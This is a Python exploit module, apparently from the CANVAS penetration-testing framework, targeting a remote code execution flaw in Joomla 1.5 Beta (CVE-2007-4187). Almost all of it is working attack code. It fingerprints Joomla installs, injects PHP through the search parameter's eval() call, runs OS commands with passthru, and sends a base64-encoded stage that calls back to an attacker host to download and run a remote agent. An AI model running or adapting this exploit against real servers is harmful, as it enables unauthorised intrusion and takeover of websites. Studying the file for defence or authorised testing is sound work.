#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys
#covers both angles
if "." not in sys.path: sys.path.append(".")

from exploitutils import *
from tcpexploit import tcpexploit
import libs.spkproxy as spkproxy #for urlopen

NAME                           = "joomla_eval"
DESCRIPTION                    = "Joomla! 1.5 Beta code execution"
DOCUMENTATION                  = {}
DOCUMENTATION['VENDOR']        = "Joomla"
DOCUMENTATION["Repeatability"] = "Infinite"
DOCUMENTATION["References"]    = ["http://www.milw0rm.com/exploits/4212","http://www.sec-consult.com/fileadmin/Advisories/20070722-0-joomla_remote_command_execution.txt"]
DOCUMENTATION["CVE Name"]      = "CVE-2007-4187"
DOCUMENTATION["CVE Url"]       = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-4187"
DOCUMENTATION['CVSS']          = 7.5
VERSION                        = "1.0"
PROPERTY                       = {}
PROPERTY['TYPE']               = "Web Exploits"
PROPERTY['SITE']               = "Remote"
PROPERTY['ARCH']               = [ ["Linux" ] , ["Windows"] ]
PROPERTY['VERSION']            = [ "All" ]

import urllib, time
from phplistener import get_php_stage1 #get our "Shellcode" 

NOTES="""
Advisory: http://www.securiteam.com/unixfocus/5PP0P0KM0O.html
Vendor: http://joomla.org

Vulnerability description:
The following scripts of a default Joomla! 1.5 beta 2 installation contain the vulnerable code:

1) components/com_search/views/search/tmpl/default_results.php
line 12: <?php eval ('echo "'. $this->result .'";'); ?>

2) templates/beez/html/com_search/search/default_results.php
line 25: echo '<p>' . eval ('echo "' . $this->result . '";');

Input of the "searchword" parameter is being passed to the mentioned eval() code and executed. 
An attacker is able to append new PHP commands after the "echo" language construct which can be used for OS command execution.
In order to bypass the search word length limitation of 20 characters a new GET parameter is being used to specify the OS commands.
"""

CHANGELOG="""
"""

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)        
        self.port               = 80
        self.host               = ""
        self.badstring          = "\x00"
        self.setVersions()
        self.version            = 0
        self.done               = 0
        self.name               = NAME    
        self.basepath           = "/"
        self.user               = ""
        self.password           = ""
        self.command            = None #none by default. We want to try to automatically load MOSDEF
        self.basicauth_user     = ""
        self.basicauth_password = ""
        self.hostname           = None

    def getargs(self):
        """
        Get arguments for attack
        """
        self.host = self.target.interface
        self.port = int(self.argsDict.get("port",self.port))
        self.getarg("basepath")
        self.getarg("command")
        
        self.ssl = self.argsDict.get("ssl",self.ssl)
        
        self.getarg("user")
        self.getarg("password")
        self.getarg("basicauth_user")
        self.getarg("basicauth_password")
        self.getarg("hostname")
        
        if self.hostname in [None, ""]:
            allhosts = self.target.get_knowledge("www_hostnames")
            if allhosts == None:
                allhosts = ["%s"%self.host]
        else:
            allhosts = [self.hostname]
        self.allhosts = allhosts
    
    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s" % (v,self.versions[v][0])

    def setVersions(self):
        self.versions = {}
        self.versions[1] = [""]

    def neededListenerTypes(self):
        import canvasengine
        return [canvasengine.PHPMULTI]
        
    def test(self):
        """
        Quicky banner check - looks for comon basepaths
        """
        self.getargs()
        self.log("Using basepath=%s"%self.basepath)
        self.log("Using vhost=%s"%self.hostname)
        if self.ssl:
            protocol="https"
        else:
            protocol="http"

        for hostname in self.allhosts:
            self.log("Testing hostname: %s"%hostname)

            #automatically check out some common basepaths, starting with the one specified
            for basepath in [self.basepath, "/joomla/"]:
                self.log("Testing for basepath: %s"%basepath)

                #If we have to do basic-auth, let's get an object from spkproxy here
                if self.basicauth_user:
                    auth=spkproxy.BasicAuth(self.basicauth_user,self.basicauth_password)
                else:
                    auth=None 
                    
                #this is the main call that does the magic here...
                fd=spkproxy.urlopen(protocol+"://"+self.host+":%s"%self.port+"/"+basepath, hostname=hostname, exploit=self, auth=auth)
                data=fd.read()

                #now that we have the web page - we parse it and look for vulnerable versions
                #list of vulnerable versions so far
                for s in ["Joomla!"]:
                    #self.log("Data=%s"%data) #print out web page (big)
                    if s in data:
                        self.log("Found Joomla in vhost %s at basepath %s"%(hostname, basepath))
                        self.argsDict["basepath"]=basepath
                        self.basepath=basepath
                        self.hostname=hostname
                        self.version=1
                        return 1
        return 0
    
    def run(self):
        self.getargs()
        
        self.setInfo("%s attacking %s:%d (in progress)" % (NAME, self.host, self.port))
        self.log("Using version: %s" % self.version)
        ret = self.test()
        if not ret:
            self.setInfo("%s against %s:%d (failed: didn't find vulnerable target!)"%(NAME,self.host,self.port))
            self.log("Testing didn't find vulnerable target")
            return 0

        self.log("Attacking %s:%d"%(self.host,self.port))
        self.log("Basic Auth User: %s"%self.basicauth_user)
        self.log("VHost: %s"%self.hostname)
        if self.ssl:
            protocol="https"
        else:
            protocol="http"

        #If we have to do basic-auth, let's get an object from spkproxy here
        if self.basicauth_user:
            auth=spkproxy.BasicAuth(self.basicauth_user,self.basicauth_password)
        else:
            auth=None
        useragentstring=protocol+"://"+self.host+":%s"%self.port+"/"+self.basepath    
        self.log("useragentstring: %s"%useragentstring)
        UA=spkproxy.UserAgent(useragentstring, auth=auth, hostname=self.hostname, exploit=self)
                                           
        if self.command:
            self.log("Command: %s"%self.command)
            command=self.command
            command="print '---1243---\n';passthru(\'"+command+"');print '---3421---\n'; ".strip()
            data = UA.GET("index.php?c=%s&searchword=%%22;eval($_GET[c]);%%23&option=com_search&Itemid=1"%(urllib.quote_plus(command)))
            if "---1243---" in data:
                result=data.split("1243---")[1].split("---3421")[0]
                self.log("Command data: %s"%prettyprint(data))
                self.log("Command result=%s"%prettyprint(result))
                ret=1
            else:
                self.log("Command not run - service patched?!")
        else:
            command=self.get_php_to_mosdef().strip()
            #command=command.replace("/","`pwd|cut -b1`") 
            self.log("PHP Callback Command: %s"%command)
            #we escape it with a " and then have a # to end it as a comment
            #A result of "Invalid argument supplied for foreach()" is normal when it works.
            #data = UA.GET("index.php?c=%s&searchword=%%22;eval(base64_decode($_GET[c]));%%23&option=com_search&Itemid=1"%(b64encode(command)))
            data = UA.GET("index.php?d=%s&c=eval(base64_decode($_GET[d]));&searchword=%%22;eval($_GET[c]);%%23&option=com_search&Itemid=1"%(b64encode(command).strip()),noresponse=True)
            self.log("Looking for PHP connectback")
            for i in xrange(0,3): #wait three seconds for callback
                time.sleep(1)
                ret=self.ISucceeded()
                if ret:
                    break
            if not ret:
                self.log("Did not succeed in getting a callback")
                #if data.count("Parse error"):
                #    self.log("Some sort of parse error in our shellcode :<")
                #file("fail.html","w").write(data)
            
        if ret:
            self.setInfo("%s attacking %s:%d - done (success!)"%(NAME,self.host,self.port))
        else:
            self.setInfo("%s attacking %s:%d - done (failed)"%(NAME,self.host,self.port))
        return ret
    
    def get_php_to_mosdef(self):
        """
        Creates a string which when included in php's eval() will download and execute
        MOSDEF
        """
        
        localhost=self.callback.ip
        localport=self.callback.port
        self.log("Using PHPMULTI callback of %s:%d"%(localhost,localport))

        badchars="" #none for this one
        ret=get_php_stage1(badchars,localhost,localport)
            
        return ret
        
    def shutdown(self):
        self.done=1


if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    
